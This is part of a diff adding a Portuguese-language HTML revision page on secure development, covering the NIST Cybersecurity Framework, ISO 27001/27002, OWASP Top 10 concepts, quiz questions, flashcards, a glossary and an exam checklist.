+            <tr><td><strong>Identificar</strong> (Identify)</td><td>Antes</td><td>Entender ativos, recursos críticos e riscos.</td><td>Gestão de ativos, ambiente de negócios, governança, avaliação e estratégia de riscos, cadeia de suprimentos.</td></tr>
+            <tr><td><strong>Proteger</strong> (Protect)</td><td>Antes</td><td>Implementar salvaguardas técnicas e físicas.</td><td>Identidade e controle de acesso, treinamento, segurança de dados, manutenção, tecnologia de proteção.</td></tr>
+            <tr><td><strong>Detectar</strong> (Detect)</td><td>Durante</td><td>Alertar a organização sobre ataques.</td><td>Anomalias e eventos, monitoramento contínuo, processos de detecção.</td></tr>
+            <tr><td><strong>Responder</strong> (Respond)</td><td>Durante</td><td>Agir adequadamente sobre o incidente.</td><td>Planejamento de resposta, comunicações, análise, mitigação, melhorias.</td></tr>
+            <tr><td><strong>Recuperar</strong> (Recover)</td><td>Depois</td><td>Restaurar a continuidade dos negócios (resiliência).</td><td>Planejamento de recuperação, melhorias, comunicações.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="mnemonic">
+        <div class="m-head">Mnemônico — as 5 funções, na ordem do incidente</div>
+        <div class="m-word">"<b>I</b>dentifico, <b>P</b>rotejo, <b>D</b>etecto, <b>R</b>espondo, <b>R</b>ecupero"</div>
+        <ul>
+          <li><b>I · P</b> → antes do ataque (conhecer e blindar)</li>
+          <li><b>D · R</b> → durante (perceber e agir)</li>
+          <li><b>R</b> → depois (voltar a operar)</li>
+        </ul>
+      </div>
+
+      <div class="callout warn reveal">
+        <span class="tag">⚠ Pegadinha — 800-53 × CSF</span>
+        <p>O material apresenta as 5 funções junto com o <strong>NIST 800-53</strong>, mas tecnicamente elas são do <strong>NIST Cybersecurity Framework (CSF)</strong> — o trabalho iniciado em 2013 é o CSF. O <strong>SP 800-53</strong> é outra publicação: o <strong>catálogo de controles</strong> de segurança e privacidade (Revisão 5, de 2020), organizado em famílias (controle de acesso, auditoria, resposta a incidentes…) e com linhas de base <strong>Baixa, Moderada e Alta</strong>, exigido pela FISMA. Se a questão pedir as 5 funções, responda Identificar–Proteger–Detectar–Responder–Recuperar; se pedir o "catálogo de centenas de controles", é o 800-53. (O CSF 2.0, de 2024, adicionou uma 6ª função, <em>Governar</em>.)</p>
+      </div>
+
+      <div class="quiz reveal" data-answer="D">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Após um ataque de ransomware, a empresa executa seu plano para restaurar backups e retomar a operação, comunicando o andamento aos clientes. Qual função do NIST corresponde a essa atividade?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>Identificar.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>Proteger.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>Detectar.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>Recuperar.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> Restaurar a operação e garantir a continuidade do negócio <strong>depois</strong> do incidente é <strong>Recuperar</strong>. <em>Identificar</em> e <em>Proteger</em> acontecem antes do ataque; <em>Detectar</em> é perceber o ataque. (Conter o ataque em andamento seria <em>Responder</em>.)</div>
+      </div>
+
+      <h3 id="iso">ISO 27001 e ISO 27002</h3>
+      <p>Normas globalmente reconhecidas sobre <span class="lead-term">SGSI</span> — Sistema de Gestão de Segurança da Informação, o conjunto de políticas, processos e controles com que a organização gerencia seus riscos de segurança. A distinção é o ponto central: a <strong>27001 diz O QUÊ</strong> o SGSI precisa ter (requisitos, certificável); a <strong>27002 diz COMO</strong> implementar os controles (guia de boas práticas, não certificável).</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Aspecto</th><th>ISO/IEC 27001</th><th>ISO/IEC 27002</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Natureza</strong></td><td><strong>Requisitos</strong> do SGSI</td><td><strong>Guia</strong> de controles e boas práticas</td></tr>
+            <tr><td><strong>Certificável?</strong></td><td><span class="pill ok">Sim</span> — auditoria externa</td><td><span class="pill warn">Não</span></td></tr>
+            <tr><td><strong>Pontos principais</strong></td><td>Escopo e contexto (limites do SGSI, partes interessadas, requisitos legais) · Política de Segurança da Informação (PSI) alinhada aos objetivos de negócio · Avaliação e tratamento de riscos (ameaças, vulnerabilidades, impactos → mitigar ou aceitar)</td><td>Políticas de segurança · Gestão de ativos (identificar, classificar, proteger) · Segurança em RH (seleção, contratação, conscientização) · Controle de acesso (privilégios, autenticação, autorização)</td></tr>
+            <tr><td><strong>Estrutura</strong></td><td>Cláusulas de gestão no ciclo PDCA (Planejar, Fazer, Checar, Agir) + Anexo A com a lista de controles.</td><td>Detalha cada controle do Anexo A. Na revisão de 2022: <strong>93 controles em 4 temas</strong> (organizacionais, pessoas, físicos, tecnológicos); a versão de 2013 tinha 114 controles em 14 seções.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="card reveal">
+        <h4>Benefícios citados na aula</h4>
+        <ul>
+          <li><strong>Gestão de riscos eficaz:</strong> abordagem estruturada para identificar, avaliar e tratar riscos.</li>
+          <li><strong>Conformidade legal e regulatória.</strong></li>
+          <li><strong>Aumento da conscientização:</strong> cultura de segurança, menos risco de erro humano.</li>
+          <li><strong>Confiança dos stakeholders</strong> (clientes, parceiros).</li>
+          <li><strong>Melhoria contínua</strong> por auditorias, revisões e atualizações regulares do SGSI.</li>
+        </ul>
+      </div>
+
+      <div class="quiz reveal" data-answer="A">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Sobre as normas ISO/IEC 27001 e 27002, assinale a alternativa correta.</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>A 27001 estabelece os requisitos para implementar e certificar um SGSI; a 27002 orienta a implementação dos controles de segurança.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>A 27002 é a norma certificável; a 27001 é apenas um guia opcional.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>Ambas são leis brasileiras de proteção de dados.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>Ambas foram criadas pela AWS e só se aplicam a ambientes de nuvem.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> <strong>27001 = requisitos/certificação</strong>; <strong>27002 = guia dos controles</strong>. A alternativa B inverte os papéis (pegadinha clássica); elas não são leis (a lei brasileira é a LGPD); e são normas internacionais da ISO/IEC, válidas para qualquer organização — a aula ressalta que não são padrões da AWS.</div>
+      </div>
+
+      <div class="quiz reveal" data-answer="C">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Qual dos itens abaixo <strong>NÃO</strong> é um pilar do AWS Well-Architected Framework?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>Sustentabilidade.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>Excelência Operacional.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>Escalabilidade.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>Otimização de Custos.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> Os 6 pilares são Excelência Operacional, Segurança, Confiabilidade, Eficiência de Performance, Otimização de Custos e Sustentabilidade. <strong>Escalabilidade</strong> é uma característica tratada <em>dentro</em> de Confiabilidade e Eficiência de Performance, não um pilar.</div>
+      </div>
+
+      <!-- ============================================================ FLASHCARDS ============================================================ -->
+      <h2 id="flashcards"><span class="h2-kicker">Autoteste</span>Flashcards</h2>
+      <div class="flashgrid reveal">
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">Vulnerabilidade × ataque × intrusão?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a"><strong>Vulnerabilidade</strong> = a falha explorável. <strong>Ataque</strong> = a tentativa de explorar. <strong>Intrusão</strong> = o ataque que deu certo (acesso efetivo).</div></div>
+        </div></div>
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">O que é Security by Design?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a">Segurança como requisito <strong>desde o início</strong>, construída junto com o software — não corrigida depois. 8 elementos: ameaças, superfície, menor privilégio, segmentação, validação, criptografia, teste contínuo, educação.</div></div>
+        </div></div>
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">Defesa primária contra SQL Injection?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a"><strong>Queries parametrizadas</strong> (prepared statements): comando e valores vão separados ao banco. Validação e menor privilégio são complementares.</div></div>
+        </div></div>
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">Os 3 tipos de XSS?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a"><strong>Refletido</strong> (vem na requisição, não é salvo) · <strong>Armazenado</strong> (salvo no banco, atinge todos — Samy/MySpace) · <strong>DOM-based</strong> (só no navegador, nunca passa pelo servidor).</div></div>
+        </div></div>
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">Onde guardar o JWT para resistir a XSS?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a">Em cookie <strong>HttpOnly</strong> (JS não lê) + <strong>Secure</strong> (só HTTPS) + <strong>SameSite</strong> (mitiga CSRF). No <code>localStorage</code>, qualquer script injetado rouba o token.</div></div>
+        </div></div>
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">O que é buffer overflow?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a">Escrever mais dados do que o buffer comporta, sobrescrevendo memória vizinha (ex.: endereço de retorno) → crash ou execução de código. Típico de <strong>C/C++</strong>.</div></div>
+        </div></div>
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">Permissiva × copyleft?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a"><strong>Permissiva</strong> (MIT, Apache, BSD): usa até em produto fechado, mantendo o aviso. <strong>Copyleft</strong> (GPL): o derivado distribuído deve ser GPL e com código aberto.</div></div>
+        </div></div>
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">SAST × DAST × SCA?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a"><strong>SAST</strong> = código sem executar (SonarQube). <strong>DAST</strong> = app rodando, atacado por fora (ZAP). <strong>SCA</strong> = dependências e CVEs (Dependency-Track, <code>npm audit</code>).</div></div>
+        </div></div>
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">O que é o Quality Gate do SonarQube?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a">Condições mínimas (cobertura, zero vulnerabilidades novas…) que o código precisa cumprir; se falhar, o <strong>pipeline de CI falha</strong> e o merge é barrado.</div></div>
+        </div></div>
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">Top 10 2021 — as 3 categorias novas?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a"><strong>A04</strong> Insecure Design · <strong>A08</strong> Software and Data Integrity Failures · <strong>A10</strong> SSRF.</div></div>
+        </div></div>
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">Para onde foram XSS, XXE e Insecure Deserialization em 2021?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a">XSS → <strong>A03 Injection</strong> · XXE → <strong>A05 Security Misconfiguration</strong> · Insecure Deserialization → <strong>A08 Integrity Failures</strong>.</div></div>
+        </div></div>
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">Juice Shop × WebGoat?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a"><strong>WebGoat</strong>: lições isoladas por vulnerabilidade, várias tecnologias. <strong>Juice Shop</strong>: e-commerce realista com desafios contínuos, só JavaScript/Node.js.</div></div>
+        </div></div>
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">WA Tool × Trusted Advisor × Security Hub?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a"><strong>WA Tool</strong>: questionário sobre os 6 pilares. <strong>Trusted Advisor</strong>: checagens automáticas (custo, performance, segurança, limites). <strong>Security Hub</strong>: conformidade com padrões (CIS, PCI, NIST) + agregação de achados.</div></div>
+        </div></div>
+        <div class="flashcard"><div class="inner">
+          <div class="face front"><div class="fc-q">ISO 27001 × 27002?</div><div class="fc-hint">clique</div></div>
+          <div class="face back"><div class="fc-a"><strong>27001</strong> = <em>o quê</em>: requisitos do SGSI, <strong>certificável</strong>. <strong>27002</strong> = <em>como</em>: guia de implementação dos controles, não certificável.</div></div>
+        </div></div>
+      </div>
+
+      <!-- ============================================================ GLOSSÁRIO ============================================================ -->
+      <h2 id="glossario"><span class="h2-kicker">Referência rápida</span>Glossário</h2>
+      <dl class="glossary reveal">
+        <div class="gloss-item"><dt>Vulnerabilidade</dt><dd>Fraqueza explorável no código, na configuração ou no processo.</dd></div>
+        <div class="gloss-item"><dt>Intrusão</dt><dd>Ataque bem-sucedido: acesso não autorizado efetivo.</dd></div>
+        <div class="gloss-item"><dt>Superfície de ataque</dt><dd>Tudo o que o sistema expõe e pode ser alvo (endpoints, portas, inputs).</dd></div>
+        <div class="gloss-item"><dt>Menor privilégio</dt><dd>Cada usuário/serviço recebe só o acesso mínimo necessário.</dd></div>
+        <div class="gloss-item"><dt>SQL Injection</dt><dd>SQL malicioso inserido num input que o app concatena na query.</dd></div>
+        <div class="gloss-item"><dt>XSS</dt><dd>Script malicioso executado no navegador de outros usuários pelo site vulnerável.</dd></div>
+        <div class="gloss-item"><dt>Session Fixation</dt><dd>Atacante fixa um ID de sessão e força a vítima a autenticar com ele.</dd></div>
+        <div class="gloss-item"><dt>Cryptojacking</dt><dd>Uso da CPU/GPU alheia para minerar criptomoeda sem consentimento.</dd></div>
+        <div class="gloss-item"><dt>Copyleft</dt><dd>Licença que exige que derivados distribuídos sigam a mesma licença (GPL).</dd></div>
+        <div class="gloss-item"><dt>Análise estática</dt><dd>Exame automatizado do código-fonte sem executá-lo (SAST).</dd></div>
+        <div class="gloss-item"><dt>CWE</dt><dd>Common Weakness Enumeration: catálogo de tipos de fraqueza; o Top 10 agrupa CWEs.</dd></div>
+        <div class="gloss-item"><dt>CVE</dt><dd>Identificador público de uma vulnerabilidade específica (ex.: CVE-2017-5638).</dd></div>
+        <div class="gloss-item"><dt>SSRF</dt><dd>Fazer o servidor requisitar um destino interno escolhido pelo atacante (A10:2021).</dd></div>
+        <div class="gloss-item"><dt>SGSI</dt><dd>Sistema de Gestão de Segurança da Informação — o objeto da ISO 27001.</dd></div>
+      </dl>
+
+      <!-- ============================================================ PEGADINHAS ============================================================ -->
+      <h2 id="pegadinhas"><span class="h2-kicker">Véspera da prova</span>Pegadinhas &amp; checklist final</h2>
+      <div class="callout exam reveal">
+        <span class="tag">🎯 Releia antes de entregar a prova</span>
+        <ul>
+          <li><strong>Vulnerabilidade</strong> existe sem ataque; <strong>ataque</strong> pode falhar; <strong>intrusão</strong> é o sucesso.</li>
+          <li>Não é preciso seguir <em>todas</em> as normas — mas <strong>LGPD e GDPR são leis</strong> e são obrigatórias.</li>
+          <li><strong>SQLi</strong> → prepared statement (não sanitização, não validação no front). <strong>Session fixation</strong> → novo ID de sessão no login.</li>
+          <li><strong>XSS armazenado</strong> atinge todos; <strong>refletido</strong> vem no link; <strong>DOM</strong> nem passa pelo servidor. JWT seguro = cookie <strong>HttpOnly</strong>.</li>
+          <li><strong>DoS</strong> = 1 origem; <strong>DDoS</strong> = botnet. <strong>Sniffing</strong> é passivo; <strong>MITM</strong> pode alterar.</li>
+          <li><strong>GPL</strong> obriga abrir o derivado <em>distribuído</em>; MIT/Apache/BSD não. Sem licença = sem permissão de uso.</li>
+          <li><strong>Análise estática não executa</strong> o código; SonarQube = SAST, ZAP = DAST, Dependency-Track = SCA.</li>
+          <li>Top 10 2021: <strong>A01 Broken Access Control</strong> no topo; <strong>novas</strong>: A04, A08, A10; <strong>fundidas</strong>: XSS→A03, XXE→A05, Deserialization→A08.</li>
+          <li><strong>Insecure Design</strong> (não foi projetado) ≠ <strong>Misconfiguration</strong> (foi projetado, mas está mal configurado).</li>
+          <li>O <strong>Top 10 é conscientização</strong>, não norma de certificação. WSTG = como testar.</li>
+          <li><strong>WebGoat</strong> = lições; <strong>Juice Shop</strong> = e-commerce realista, só Node.js.</li>
+          <li>Well-Architected tem <strong>6 pilares</strong> (Escalabilidade não é um deles). <strong>Security Hub</strong> = padrões de conformidade + achados.</li>
+          <li>As 5 funções <strong>Identificar–Proteger–Detectar–Responder–Recuperar</strong> são do NIST CSF; o <strong>800-53</strong> é o catálogo de controles.</li>
+          <li><strong>PCI DSS</strong> = dados de cartão, padrão contratual das bandeiras (não lei): mascarar o número, ID único por pessoa, sem senha padrão.</li>
+          <li><strong>27001</strong> = requisitos, certificável; <strong>27002</strong> = guia de controles.</li>
+        </ul>
+      </div>
+
+      <footer>
+        <div class="nav-prev-next">
+          <a href="kubernetes.html"><div class="dir">← Tópico anterior</div><div class="ttl">11 · Kubernetes &amp; AWS EKS</div></a>
+          <a href="index.html#topicos" class="next"><div class="dir">Voltar ao →</div><div class="ttl">Hub de Revisão</div></a>
+        </div>
+        <div>Tópico 12 · Desenvolvimento Seguro &amp; OWASP Top 10 · revisão para a prova final. Base: OWASP Top 10 (2017 e 2021), OWASP WSTG, Juice Shop, WebGoat, Dependency-Track e ZAP; AWS Well-Architected Framework e AWS Security Hub; CIS AWS Foundations Benchmark; PCI DSS (PCI SSC); NIST SP 800-53 e NIST Cybersecurity Framework; ISO/IEC 27001 e 27002; CISA — Secure by Design.</div>
+      </footer>
+
+    </div>
+  </main>
+</div>
+<script src="assets/study.js"></script>
+</body>
+</html>
